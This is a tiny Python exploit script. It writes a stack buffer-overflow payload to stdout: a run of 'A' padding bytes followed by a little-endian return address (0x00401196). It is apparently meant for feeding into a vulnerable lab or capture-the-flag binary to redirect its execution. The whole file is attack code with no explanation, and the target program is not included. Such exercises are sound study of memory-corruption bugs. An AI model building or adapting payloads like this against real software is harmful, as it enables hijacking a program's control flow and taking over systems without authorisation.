import sys

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload+= b"\x00\x40\x11\x96"[::-1]

sys.stdout.buffer.write(payload)